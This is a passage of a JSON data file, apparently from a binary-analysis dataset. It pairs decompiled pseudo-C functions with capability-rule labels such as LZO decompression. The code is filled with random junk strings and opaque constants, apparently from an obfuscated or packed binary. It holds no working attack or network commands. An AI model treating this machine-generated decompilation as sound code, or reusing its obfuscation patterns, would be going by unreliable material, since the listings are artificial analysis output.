4) = 1;\n    *(puVar1 + -0x34) = 0x444915;\n    fcn.00406677(*(puVar1 + -0x30));\n    puVar2 = var_6ch;\n    var_78h = var_6ch;\n    *(var_6ch + -4) = var_6ch;\n    var_74h = puVar2 + -0x58;\n    var_70h = puVar2 + -0x30;\n    *(puVar2 + -0x5c) = \"duzyotepeyxplgkoppixodqurzaofaocbrzjnmayi\";\n    *(puVar2 + -0x60) = 0x444945;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    var_10h = 10;\n    *(puVar2 + -0x60) = \"blswjlxzshnfqdcwcxousrlpjyklopsstrsenrdttmlqphrrfaluzwygardtymnrr\";\n    *(puVar2 + -100) = 0x444967;\n    fcn.00401e79(*(puVar2 + -0x60));\n    puVar1 = var_74h;\n    *var_74h = 0;\n    *(puVar1 + 4) = 0x157a;\n    *(puVar1 + 0x20) = 0x1994;\n    *(puVar1 + 0x24) = 0x1497;\n    *(puVar1 + 0x44) = 0x40d054c0;\n    *(puVar1 + 0x40) = 0;\n    *(puVar1 + 0x4c) = 0x40eeaba0;\n    *(puVar1 + 0x48) = 0;\n    *(puVar1 + 0x54) = 0x40eaaf60;\n    *(puVar1 + 0x50) = 0;\n    var_10h = 0;\n    *(puVar2 + -100) = 0x4449c0;\n    fcn.00401be0(*(puVar2 + -0x60));\n    puVar2 = var_78h;\n    puVar5 = var_78h + -0xc;\n    puVar6 = var_78h + -0xc;\n    var_84h = var_78h + -0xc;\n    puVar7 = var_78h + -0xc;\n    *(var_78h + -4) = 0;\n    *(puVar2 + -8) = 0x498;\n    *puVar5 = 0xa39;\n    *(puVar2 + -0x10) = 0x4449eb;\n    fcn.00405db2(*puVar6, *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x10) = puVar7;\n    var_80h = puVar2 + -0x44;\n    var_7ch = puVar2 + -0x28;\n    *(puVar2 + -0x48) = \"odnhhvmpezsdcuwioahzafopzuzuufzr\";\n    *(puVar2 + -0x4c) = 0x444a1b;\n    fcn.00401e79(*(puVar2 + -0x48));\n    var_10h = 9;\n    *(puVar2 + -0x4c) = \"itdxlwbrttrcij\";\n    *(puVar2 + -0x50) = 0x444a3d;\n    fcn.00401e79(*(puVar2 + -0x4c));\n    puVar1 = var_80h;\n    *var_80h = 0;\n    puVar1[0x34] = 1;\n    *(puVar2 + -0x50) = 0x444a54;\n    fcn.00403143(*(puVar2 + -0x4c));\n    puVar2 = var_84h;\n    var_90h = var_84h;\n    *(var_84h + -4) = var_84h;\n    var_8ch = puVar2 + -0x38;\n    var_88h = puVar2 + -0x1c;\n    var_10h = 0;\n    *(puVar2 + -0x3c) = \"skdkuuuvsfgbsqxncyujsdlkkuoqcfdpmjdckcnofecxzngkmcsnho\";\n    *(puVar2 + -0x40) = 0x444a92;\n    fcn.00401e79(*(puVar2 + -0x3c));\n    var_10h = 8;\n    *(puVar2 + -0x40) = \"csbxbsyikrduuvvchzyauwpumozdbvzkzqqimdxucxmvbbmsmwvhwypqhtujnp\";\n    *(puVar2 + -0x44) = 0x444ab7;\n    fcn.00401e79(*(puVar2 + -0x40));\n    puVar1 = var_8ch;\n    *var_8ch = 0;\n    *(puVar1 + 0x34) = 0x984;\n    var_10h = 0;\n    *(puVar2 + -0x44) = 0x444adb;\n    fcn.00401e15(*(puVar2 + -0x40));\n    puVar1 = var_90h;\n    var_9ch = var_90h;\n    *(var_90h + -4) = var_90h;\n    var_98h = puVar1 + -0x60;\n    var_94h = puVar1 + -0x18;\n    *(puVar1 + -100) = \"ydbtfagmshkfygfmwjiqeeiymoecrmadbjzngloxhjqhjcxqcmtrjheqkcmulypdadvjgjdzfppxrkwhbaguzfzkz\";\n    *(puVar1 + -0x68) = 0x444b17;\n    fcn.00401e79(*(puVar1 + -100));\n    var_10h = 7;\n    *(puVar1 + -0x68) = \"rwnykdzdirjdifudzapsmsq\";\n    *(puVar1 + -0x6c) = 0x444b3c;\n    fcn.00401e79(*(puVar1 + -0x68));\n    piVar4 = var_98h;\n    *var_98h = &fcn.004447e0::var_50h;\n    piVar4[2] = 0x40c72a80;\n    piVar4[1] = 0;\n    piVar4[3] = 0xa43;\n    *(piVar4 + 4) = 1;\n    *(piVar4 + 5) = 1;\n    *(piVar4 + 6) = 1;\n    piVar4[0xe] = 0x40cae980;\n    piVar4[0xd] = 0;\n    piVar4[0x10] = 0x40ea6a40;\n    piVar4[0xf] = 0;\n    piVar4[0x11] = 0xc48;\n    var_10h = 0;\n    *(puVar1 + -0x6c) = 0x444b9f;\n    fcn.0040187a(*(puVar1 + -0x68));\n    puVar1 = var_9ch;\n    *(var_9ch + -4) = 0x444bb4;\n    fcn.00403b02();\n    var_a8h = puVar1;\n    var_a4h = puVar1 + -0x7c;\n    var_a0h = puVar1 + -0x1c;\n    *(puVar1 + -0x80) = \"lkfehnhajkuvvmnpjbxmrbzvmxtknbxuhuaemxcflrufdlfsevoblvyuawmfuqpluvfzhghfysst\";\n    *(puVar1 + -0x84) = 0x444be2;\n    fcn.00401e79(*(puVar1 + -0x80));\n    var_ach = var_a4h + 0xf;\n    var_10h = 4;\n    *(puVar1 + -0x84) = \"pgcoltpyihuyybgvflsqtxzqzecntaxfgjkcaitpxuptrbjpq\";\n    *(puVar1 + -0x88) = 0x444c0d;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_b0h = var_a4h + 8;\n    var_10h = 5;\n    *(puVar1 + -0x88) = \"tteytnotzebi\";\n    *(puVar1 + -0x8c) = 0x444c38;\n    fcn.00401e79(*(puVar1 + -0x88));\n    var_10h = 6;\n    *(puVar1 + -0x8c) = \"dzwxzcdopjnqkmpqzmytvxjrsdflwggdylvdnwovkttllbjeyhyfbipinezfvygoefczc\";\n    *(puVar1 + -0x90) = 0x444c5d;\n    fcn.00401e79(*(puVar1 + -0x8c));\n    puVar3 = var_a4h;\n    *var_a4h = 0x153f;\n    *(puVar3 + 7) = 0;\n    *(puVar3 + 0xe) = 0;\n    puVar3[0x16] = 0x405a4000;\n    puVar3[0x15] = 0;\n    *(puVar3 + 0x17) = 1;\n    puVar3[0x1e] = 0x50;\n    *(puVar1 + -0x90) = 0x444c97;\n    fcn.00404d0e(*(puVar1 + -0x8c));\n    puVar2 = var_a8h;\n    var_10h = 0;\n    var_b4h = var_a8h + -0x28;\n    puVar8 = var_a8h + -0x28;\n    puVar9 = var_a8h + -0x28;\n    var_c0h = var_a8h + -0x28;\n    puVar10 = var_a8h + -0x28;\n    *(var_a8h + -0x10) = 0x40d24780;\n    *(puVar2 + -0x14) = 0;\n    *(puVar2 + -0x1c) = 0x40937400;\n    *(puVar2 + -0x20) = 0;\n    *(puVar2 + -0x24) = 0x40d714c0;\n    *puVar8 = 0;\n    *(puVar2 + -4) = 0x542;\n    *(puVar2 + -8) = 0x5f6;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x2c) = 0x444cfe;\n    fcn.00403bfc(*puVar9, *(puVar2 + -0x24), *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14)\n                 , *(puVar2 + -0x10), *(puVar2 + -0xc), *(puVar2 + -8), *(puVar2 + -4));\n    *(puVar2 + -0x2c) = puVar10;\n    var_bch = puVar2 + -0xa0;\n    var_b8h = puVar2 + -0x48;\n    *(puVar2 + -0xa4) = \"fyfgpvvzx\";\n    *(puVar2 + -0xa8) = 0x444d32;\n    fcn.00401e79(*(puVar2 + -0xa4));\n    var_c4h = var_bch + 0x3c;\n    var_10h = 1;\n    *(puVar2 + -0xa8) = \"wcyvzibfgxfvipgulyyozcwkuvxxrcxatcjomxyqc\";\n    *(puVar2 + -0xac) = 0x444d5d;\n    fcn.00401e79(*(puVar2 + -0xa8));\n    var_c8h = var_bch + 0x18;\n    var_10h = 2;\n    *(puVar2 + -0xac) = \"onwafdxcvmjkix\";\n    *(puVar2 + -0xb0) = 0x444d88;\n    fcn.00401e79(*(puVar2 + -0xac));\n    var_10h = 3;\n    *(puVar2 + -0xb0) = \"uasrpffpubhvqfvjvmtqriktxkryaqcrrxkxyvuxoeglebtzkgxxesxajdxfsulnpkknjwgwgtukuy\";\n    *(puVar2 + -0xb4) = 0x444daa;\n    fcn.00401e79(*(puVar2 + -0xb0));\n    puVar1 = var_bch;\n    *(var_bch + 0x34) = 0x40af7c00;\n    *(puVar1 + 0x30) = 0;\n    puVar1[0x38] = 0;\n    puVar1[0x54] = 0;\n    *(puVar1 + 0x74) = 0x40b60400;\n    *(puVar1 + 0x70) = 0;\n    *(puVar2 + -0xb4) = 0x444de1;\n    fcn.00403643(*(puVar2 + -0xb0));\n    puVar1 = var_c0h;\n    var_d0h = var_c0h;\n    *(var_c0h + -4) = var_c0h;\n    var_cch = puVar1 + -0x1c;\n    var_10h = 0;\n    *(puVar1 + -0x20) = \"mfwzffvl\";\n    *(puVar1 + -0x24) = 0x444e19;\n    fcn.00401e79(*(puVar1 + -0x20));\n    *var_cch = 0x442;\n    *(puVar1 + -0x24) = 0x444e32;\n    fcn.00406118(*(puVar1 + -0x20));\n    *in_FS_OFFSET = var_18h;\n    return var_64h;\n}\n",
        "token_count": 4482
    },
    "00447320": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t __fastcall fcn.00447320(int32_t param_1)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack384 [10];\n    uint uStack344;\n    uchar *var_150h;\n    uchar *var_14ch;\n    uchar *var_148h;\n    uchar *var_144h;\n    uchar *var_140h;\n    uchar *var_13ch;\n    uchar *var_138h;\n    uchar *var_134h;\n    uchar *var_130h;\n    uchar *var_12ch;\n    int32_t *var_128h;\n    uchar *var_124h;\n    uchar *var_120h;\n    uchar *var_11ch;\n    uchar *var_118h;\n    uchar *var_114h;\n    uchar *var_110h;\n    uchar *var_10ch;\n    uchar *var_108h;\n    uchar *var_104h;\n    int32_t *var_100h;\n    uchar *var_fch;\n    uchar *var_f8h;\n    uchar *var_f4h;\n    int32_t *var_f0h;\n    uchar *var_ech;\n    uchar *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    uchar *var_dch;\n    uchar *var_d8h;\n    uchar *var_d4h;\n    uchar *var_d0h;\n    int32_t *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    int32_t var_c0h;\n    int32_t var_bch;\n    uint *var_b8h;\n    uint *var_b4h;\n    uint var_b0h;\n    uint var_98h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    int32_t var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_1ch = &fcn.00447320::var_150h;\n    var_b8h = &fcn.00447320::var_150h;\n    var_10h = 0xffffffff;\n    var_14h = 0x451340;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00447320::var_18h;\n    var_bch = param_1 + 8;\n    uStack344 = 0x44736c;\n    var_c0h = param_1;\n    var_20h = param_1;\n    fcn.004040a7();\n    var_b4h = &stack0xfffffe80;\n    var_10h = 0;\n    arg_8h = \"pzuewbodberloixawc\";\n    fcn.00401e79(\"pzuewbodberloixawc\");\n    puVar4 = var_b4h;\n    *var_b4h = 0x78c;\n    *(puVar4 + 7) = 1;\n    puVar4[9] = 0x40e388c0;\n    puVar4[8] = 0;\n    puVar4[10] = 0xe96;\n    fcn.0040292d(arg_8h);\n    puVar2 = var_b8h;\n    var_c8h = var_b8h;\n    *(var_b8h + -4) = var_b8h;\n    var_c4h = puVar2 + -0x24;\n    *(puVar2 + -0x28) = \"evcbbykeichowykhyabtodcjivtvtfyfoahaceteruwpauompdpkfgpas\";\n    *(puVar2 + -0x2c) = 0x4473fe;\n    fcn.00401e79(*(puVar2 + -0x28));\n    puVar1 = var_c4h;\n    *(var_c4h + 0x18) = 0x1f6;\n    puVar1[0x1c] = 0;\n    *(puVar1 + 0x20) = 0x1523;\n    *(puVar2 + -0x2c) = 0x447426;\n    fcn.0040525e(*(puVar2 + -0x28));\n    puVar1 = var_c8h;\n    puVar5 = var_c8h + -0xc;\n    var_d0h = var_c8h + -0xc;\n    *(var_c8h + -0xc) = &fcn.00447320::var_38h;\n    *(puVar1 + -4) = 0x40e97d80;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x10) = 0x447451;\n    fcn.00405344(*puVar5, *(puVar1 + -8));\n    *(puVar1 + -0x10) = 0x44745e;\n    fcn.00403b02();\n    var_cch = puVar1 + -0x2c;\n    *(puVar1 + -0x30) = \"zuhlyddqhxdmmfabvqmhstsyewje\";\n    *(puVar1 + -0x34) = 0x447486;\n    fcn.00401e79(*(puVar1 + -0x30));\n    piVar3 = var_cch;\n    *var_cch = &fcn.00447320::var_50h;\n    *(piVar3 + 7) = 1;\n    *(puVar1 + -0x34) = 0x4474a5;\n    fcn.0040503d(*(puVar1 + -0x30));\n    puVar2 = var_d0h;\n    *(var_d0h + -4) = 0x4474ba;\n    fcn.00403b02();\n    var_dch = puVar2;\n    var_d8h = puVar2 + -0x74;\n    var_d4h = puVar2 + -0x18;\n    *(puVar2 + -0x78) = \"xolkorcthtsslaykfpioonzpwvoqvgeurtss\";\n    *(puVar2 + -0x7c) = 0x4474e8;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_e0h = var_d8h + 0x44;\n    var_10h = 6;\n    *(puVar2 + -0x7c) = \"nidvc\";\n    *(puVar2 + -0x80) = 0x447513;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    var_e4h = var_d8h + 0x28;\n    var_10h = 7;\n    *(puVar2 + -0x80) = \"vxuijyqjjnedekjsmvbmv\";\n    *(puVar2 + -0x84) = 0x44753e;\n    fcn.00401e79(*(puVar2 + -0x80));\n    var_10h = 8;\n    *(puVar2 + -0x84) = \"llneupdyrknzjldjbkedvbracdwnostxnvyamrbklnigbfkjkedvgvdioerqlsuspewshcxxku\";\n    *(puVar2 + -0x88) = 0x447560;\n    fcn.00401e79(*(puVar2 + -0x84));\n    puVar1 = var_d8h;\n    *(var_d8h + 0x1c) = 0x40a90c00;\n    *(puVar1 + 0x18) = 0;\n    *(puVar1 + 0x24) = 0x40be5300;\n    *(puVar1 + 0x20) = 0;\n    puVar1[0x40] = 0;\n    var_10h = 0;\n    *(puVar2 + -0x88) = 0x44759d;\n    fcn.00405579(*(puVar2 + -0x84));\n    puVar1 = var_dch;\n    *(var_dch + -4) = 0x4475b5;\n    fcn.0040601e();\n    var_ech = puVar1;\n    var_e8h = puVar1 + -0x1c;\n    *(puVar1 + -0x20) = 0x54a2eb;\n    *(puVar1 + -0x24) = 0x4475df;\n    fcn.00401e79(*(puVar1 + -0x20));\n    *(var_e8h + 0x18) = 0x1223;\n    *(puVar1 + -0x24) = 0x4475fc;\n    fcn.004067bc(*(puVar1 + -0x20));\n    puVar1 = var_ech;\n    *(var_ech + -4) = 0x447614;\n    fcn.004021cb();\n    var_f4h = puVar1 + -4;\n    *(puVar1 + -4) = 0x252;\n    *(puVar1 + -8) = 0x44762f;\n    fcn.00401901(*(puVar1 + -4));\n    var_f0h = puVar1 + -0x30;\n    *(puVar1 + -0x34) = \"ixxbtaaoriptajuwxvmucmgzftswueofxwqmkkxqxerjodvmxkwvndhrardurfpbqmbxzlyzrdowia\";\n    *(puVar1 + -0x38) = 0x447659;\n    fcn.00401e79(*(puVar1 + -0x34));\n    piVar3 = var_f0h;\n    *var_f0h = &fcn.00447320::var_68h;\n    piVar3[7] = 0x13c3;\n    *(piVar3 + 8) = 0;\n    piVar3[10] = 0x40d8b1c0;\n    piVar3[9] = 0;\n    *(puVar1 + -0x38) = 0x44768d;\n    fcn.00401956(*(puVar1 + -0x34));\n    puVar1 = var_f4h;\n    *(var_f4h + -4) = 0x4476a2;\n    fcn.00403b02();\n    *(puVar1 + -4) = &fcn.00447320::var_80h;\n    *(puVar1 + -8) = 0x4476b7;\n    fcn.004064e2(*(puVar1 + -4));\n    *(puVar1 + -8) = 0x4476c4;\n    fcn.00403b02();\n    var_f8h = puVar1 + -0x34;\n    *(puVar1 + -0xc) = 0x40c0d600;\n    *(puVar1 + -0x10) = 0;\n    *(puVar1 + -0x14) = 0x40e6a320;\n    *(puVar1 + -0x18) = 0;\n    *(puVar1 + -0x28) = 0x40e84e60;\n    *(puVar1 + -0x2c) = 0;\n    *(puVar1 + -0x30) = 0x40d297c0;\n    *(puVar1 + -0x34) = 0;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x1c) = 0x8b;\n    *(puVar1 + -0x20) = 0;\n    *(puVar1 + -0x24) = 0xc24;\n    *(puVar1 + -0x38) = 0x44772d;\n    fcn.00405ace(*(puVar1 + -0x34), *(puVar1 + -0x30), *(puVar1 + -0x2c), *(puVar1 + -0x28), *(puVar1 + -0x24), \n                 *(puVar1 + -0x20), *(puVar1 + -0x1c), *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10), \n                 *(puVar1 + -0xc), *(puVar1 + -8));\n    var_104h = puVar1 + -0x44;\n    *(puVar1 + -0x38) = 0x40cd9080;\n    *(puVar1 + -0x3c) = 0;\n    *(puVar1 + -0x40) = 0x40d8b940;\n    *(puVar1 + -0x44) = 0;\n    *(puVar1 + -0x48) = 0x447758;\n    fcn.00401393(*(puVar1 + -0x44), *(puVar1 + -0x40), *(puVar1 + -0x3c));\n    *(puVar1 + -0x48) = puVar1 + -0x44;\n    var_100h = puVar1 + -0x80;\n    var_fch = puVar1 + -100;\n    *(puVar1 + -0x84) = \"gmbozcybcwgzdnflmpvgfigqleefmhpwjisvvhhirmhljsgcwbxdlpvvcbwbhqtzswktmjqnlzrhpxtv\";\n    *(puVar1 + -0x88) = 0x44778c;\n    fcn.00401e79(*(puVar1 + -0x84));\n    var_10h = 5;\n    *(puVar1 + -0x88) = \"wpgijxktvfpvakygxzlzqqzgrwaeditxwxugebgcgwnkfsmniv\";\n    *(puVar1 + -0x8c) = 0x4477b1;\n    fcn.00401e79(*(puVar1 + -0x88));\n    piVar3 = var_100h;\n    *var_100h = &fcn.00447320::var_98h;\n    piVar3[0xe] = 0x4095f400;\n    piVar3[0xd] = 0;\n    var_10h = 0;\n    *(puVar1 + -0x8c) = 0x4477e4;\n    fcn.0040202c(*(puVar1 + -0x88));\n    puVar2 = var_104h;\n    *(var_104h + -4) = 0x4477fc;\n    fcn.00403b02();\n    var_10ch = puVar2;\n    var_108h = puVar2 + -0x34;\n    *(puVar2 + -0x38) = \"csnqvepjigeecna\";\n    *(puVar2 + -0x3c) = 0x447821;\n    fcn.00401e79(*(puVar2 + -0x38));\n    puVar1 = var_108h;\n    var_108h[0x18] = 0;\n    *(puVar1 + 0x1c) = 0x8a7;\n    puVar1[0x20] = 1;\n    *(puVar1 + 0x28) = 0x408c7800;\n    *(puVar1 + 0x24) = 0;\n    *(puVar1 + 0x2c) = 0x2dc;\n    puVar1[0x30] = 1;\n    *(puVar2 + -0x3c) = 0x44785f;\n    fcn.00402c20(*(puVar2 + -0x38));\n    puVar2 = var_10ch;\n    var_118h = var_10ch;\n    *(var_10ch + -4) = var_10ch;\n    var_114h = puVar2 + -0x54;\n    var_110h = puVar2 + -0x2c;\n    *(puVar2 + -0x58) = \"tgyqspbcp\";\n    *(puVar2 + -0x5c) = 0x447896;\n    fcn.00401e79(*(puVar2 + -0x58));\n    var_10h = 4;\n    *(puVar2 + -0x5c) = \"dlieiyhtsrdwjgyfrngfnajegmwvxrfvcdzlzvekwgwd\";\n    *(puVar2 + -0x60) = 0x4478bb;\n    fcn.00401e79(*(puVar2 + -0x5c));\n    puVar1 = var_114h;\n    *var_114h = 0;\n    *(puVar1 + 4) = 0x797;\n    *(puVar1 + 8) = 0x66a;\n    *(puVar1 + 0x24) = 0x882;\n    puVar1[0x40] = 1;\n    *(puVar1 + 0x48) = 0x40f180c0;\n    *(puVar1 + 0x44) = 0;\n    *(puVar1 + 0x50) = 0x40c5ae80;\n    *(puVar1 + 0x4c) = 0;\n    var_10h = 0;\n    *(puVar2 + -0x60) = 0x447910;\n    fcn.004021bc(*(puVar2 + -0x5c));\n    puVar2 = var_118h;\n    var_120h = var_118h;\n    *(var_118h + -4) = var_118h;\n    var_11ch = puVar2 + -0x20;\n    *(puVar2 + -0x24) = \"kfhxeqmquwiveundecgjxsrganftgotvjowvxrshozd\";\n    *(puVar2 + -0x28) = 0x447943;\n    fcn.00401e79(*(puVar2 + -0x24));\n    puVar1 = var_11ch;\n    *(var_11ch + 0x18) = 0x7e6;\n    *(puVar1 + 0x1c) = 0x452;\n    *(puVar2 + -0x28) = 0x447967;\n    fcn.00406627(*(puVar2 + -0x24));\n    puVar1 = var_120h;\n    var_12ch = var_120h;\n    *(var_120h + -4) = var_120h;\n    var_128h = puVar1 + -0x48;\n    var_124h = puVar1 + -0x20;\n    *(puVar1 + -0x4c) = \"vnlbryvjtvymftwsimcebtsnjxr\";\n    *(puVar1 + -0x50) = 0x44799e;\n    fcn.00401e79(*(puVar1 + -0x4c));\n    var_10h = 3;\n    *(puVar1 + -0x50) = \"isisjkusqowcrkbqtdhqoyhebepjnvk\";\n    *(puVar1 + -0x54) = 0x4479c3;\n    fcn.00401e79(*(puVar1 + -0x50));\n    piVar3 = var_128h;\n    *var_128h = &fcn.00447320::var_b0h;\n    piVar3[1] = 0x5ef;\n    piVar3[3] = 0x40d692c0;\n    piVar3[2] = 0;\n    piVar3[0x11] = 0x40f34530;\n    piVar3[0x10] = 0;\n    var_10h = 0;\n    *(puVar1 + -0x54) = 0x447a0b;\n    fcn.00405a7e(*(puVar1 + -0x50));\n    puVar2 = var_12ch;\n    *(var_12ch + -4) = 0x447a23;\n    fcn.00403b02();\n    var_130h = puVar2 + -0x34;\n    var_13ch = puVar2 + -0x34;\n    *(puVar2 + -4) = 0x40c28900;\n    *(puVar2 + -8) = 0;\n    *(puVar2 + -0x14) = 0x40a4e800;\n    *(puVar2 + -0x18) = 0;\n    *(puVar2 + -0x30) = 0x40c97c80;\n    *(puVar2 + -0x34) = 0;\n    *(puVar2 + -0xc) = 0;\n    *(puVar2 + -0x10) = 1;\n    *(puVar2 + -0x1c) = 0x1f8;\n    *(puVar2 + -0x20) = 0x888;\n    *(puVar2 + -0x24) = 0x787;\n    *(puVar2 + -0x28) = 0xb6f;\n    *(puVar2 + -0x2c) = 0x1289;\n    *(puVar2 + -0x38) = 0x447a93;\n    fcn.004013b6(*(puVar2 + -0x34), *(puVar2 + -0x30), *(puVar2 + -0x2c), *(puVar2 + -0x28), *(puVar2 + -0x24), \n                 *(puVar2 + -0x20), *(puVar2 + -0x1c), *(puVar2 + -0x18), *(puVar2 + -0x14), *(puVar2 + -0x10), \n                 *(puVar2 + -0xc), *(puVar2 + -8));\n    *(puVar2 + -0x38) = 0x447aa3;\n    fcn.00406857();\n    var_138h = puVar2 + -0x74;\n    var_134h = puVar2 + -0x58;\n    *(puVar2 + -0x78) = 0x5502df;\n    *(puVar2 + -0x7c) = 0x447ad8;\n    fcn.00401e79(*(puVar2 + -0x78));\n    var_10h = 2;\n    *(puVar2 + -0x7c) = \"byxeotcde\";\n    *(puVar2 + -0x80) = 0x447afd;\n    fcn.00401e79(*(puVar2 + -0x7c));\n    puVar1 = var_138h;\n    *var_138h = 0;\n    *(puVar1 + 0x34) = 0x433;\n    *(puVar1 + 0x38) = 0x2b7;\n    puVar1[0x3c] = 1;\n    var_10h = 0;\n    *(puVar2 + -0x80) = 0x447b2f;\n    fcn.00405baa(*(puVar2 + -0x7c));\n    puVar2 = var_13ch;\n    var_148h = var_13ch;\n    *(var_13ch + -4) = var_13ch;\n    var_144h = puVar2 + -0x40;\n    var_140h = puVar2 + -0x18;\n    *(puVar2 + -0x44) = \"gvajfwsiifievqdhhezeofvykz\";\n    *(puVar2 + -0x48) = 0x447b6d;\n    fcn.00401e79(*(puVar2 + -0x44));\n    var_10h = 1;\n    *(puVar2 + -0x48) = \"jdpcshghxyqczwghehodrwnwrpepxgioexqsmjgevhjjtnfauwwyeatxlbg\";\n    *(puVar2 + -0x4c) = 0x447b92;\n    fcn.00401e79(*(puVar2 + -0x48));\n    puVar1 = var_144h;\n    *var_144h = 0;\n    *(puVar1 + 8) = 0x40ca6d80;\n    *(puVar1 + 4) = 0;\n    *(puVar1 + 0xc) = 0xd80;\n    *(puVar2 + -0x4c) = 0x447bc0;\n    fcn.00404458(*(puVar2 + -0x48));\n    puVar2 = var_148h;\n    var_150h = var_148h;\n    *(var_148h + -4) = var_148h;\n    var_14ch = puVar2 + -0x2c;\n    var_10h = 0;\n    *(puVar2 + -0x30) =\n         \"nrzawrexwquyxuwijnocbyuqhtnknjaxitxtvcndchuawkqfvqjjxqwhzgqztcxayojwtxumniggcokwmbdekmtlcdgagkiah\";\n    *(puVar2 + -0x34) = 0x447bf8;\n    fcn.00401e79(*(puVar2 + -0x30));\n    puVar1 = var_14ch;\n    *var_14ch = 0;\n    *(puVar1 + 0x1c) = 0x1520;\n    puVar1[0x20] = 0;\n    *(puVar1 + 0x28) = 0x40d38300;\n    *(puVar1 + 0x24) = 0;\n    *(puVar2 + -0x34) = 0x447c2a;\n    fcn.004029cd(*(puVar2 + -0x30));\n    *in_FS_OFFSET = var_18h;\n    return var_c0h;\n}\n",
        "token_count": 6027
    },
    "0044ab30": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint fcn.0044ab30(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t *in_FS_OFFSET;\n    char *arg_8h;\n    uint auStack316 [19];\n    uint uStack240;\n    uchar *var_e8h;\n    uchar *var_e4h;\n    uchar *var_e0h;\n    int32_t *var_dch;\n    uchar *var_d8h;\n    int32_t *var_d4h;\n    uchar *var_d0h;\n    uchar *var_cch;\n    uchar *var_c8h;\n    uchar *var_c4h;\n    uchar *var_c0h;\n    uchar *var_bch;\n    uchar *var_b8h;\n    uchar *var_b4h;\n    uchar *var_b0h;\n    uint *var_ach;\n    uchar *var_a8h;\n    uchar *var_a4h;\n    int32_t *var_a0h;\n    uchar *var_9ch;\n    uchar *var_98h;\n    uint *var_94h;\n    uint *var_90h;\n    uint var_8ch;\n    int32_t var_88h;\n    int32_t var_84h;\n    uint var_80h;\n    uint var_68h;\n    uint var_50h;\n    uint var_38h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint *puVar6;\n    \n    var_1ch = &fcn.0044ab30::var_e8h;\n    var_94h = &fcn.0044ab30::var_e8h;\n    var_10h = 0xffffffff;\n    var_14h = 0x451560;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0044ab30::var_18h;\n    uStack240 = 0x44ab7b;\n    fcn.004040a7();\n    var_88h = var_84h + 0x3c;\n    uStack240 = 0x44ab8f;\n    fcn.004040a7();\n    var_10h = 1;\n    uStack240 = 0x44aba1;\n    fcn.0040349f();\n    var_90h = &stack0xfffffec4;\n    arg_8h = \"dhggztyzgbytwnatkcztswcbnfihuraziaceuxniivplzrbpsmdeevck\";\n    fcn.00401e79(\"dhggztyzgbytwnatkcztswcbnfihuraziaceuxniivplzrbpsmdeevck\");\n    puVar4 = var_90h;\n    *var_90h = 0x141c;\n    puVar4[2] = 0x40dc0cc0;\n    puVar4[1] = 0;\n    *(puVar4 + 3) = 1;\n    puVar4[4] = 0xdd8;\n    *(puVar4 + 5) = 1;\n    puVar4[7] = 0x40d10a00;\n    puVar4[6] = 0;\n    puVar4[9] = 0x40debf40;\n    puVar4[8] = 0;\n    puVar4[0xb] = 0x40a79000;\n    puVar4[10] = 0;\n    puVar4[0xd] = 0x40e71e20;\n    puVar4[0xc] = 0;\n    fcn.00401c71(arg_8h);\n    puVar1 = var_94h;\n    *(var_94h + -4) = 0x44ac59;\n    fcn.004014f6();\n    var_98h = puVar1 + -0x2c;\n    var_a4h = puVar1 + -0x2c;\n    *(puVar1 + -0x2c) = &fcn.0044ab30::var_38h;\n    *(puVar1 + -4) = 0x40d95680;\n    *(puVar1 + -8) = 0;\n    *(puVar1 + -0x10) = 0x40ef0620;\n    *(puVar1 + -0x14) = 0;\n    *(puVar1 + -0x18) = 0x40e27280;\n    *(puVar1 + -0x1c) = 0;\n    *(puVar1 + -0x24) = 0x40ee3cc0;\n    *(puVar1 + -0x28) = 0;\n    *(puVar1 + -0xc) = 0x2193;\n    *(puVar1 + -0x20) = 0xda7;\n    *(puVar1 + -0x30) = 0x44acbf;\n    fcn.0040607d(*(puVar1 + -0x2c), *(puVar1 + -0x28), *(puVar1 + -0x24), *(puVar1 + -0x20), *(puVar1 + -0x1c), \n                 *(puVar1 + -0x18), *(puVar1 + -0x14), *(puVar1 + -0x10), *(puVar1 + -0xc), *(puVar1 + -8));\n    *(puVar1 + -0x30) = 0x44accc;\n    fcn.00403b02();\n    *(puVar1 + -0x30) = 0x44acd7;\n    fcn.00406285();\n    var_a0h = puVar1 + -0x80;\n    var_9ch = puVar1 + -0x48;\n    *(puVar1 + -0x84) =\n         \"dbjsoygvodetdmpbfmbtjfhkxlumsczbwqistgbweiydogkgygwabxkofmlqesisvlmbwjqraswgbkfwrgelgktiwliflul\";\n    *(puVar1 + -0x88) = 0x44ad0a;\n    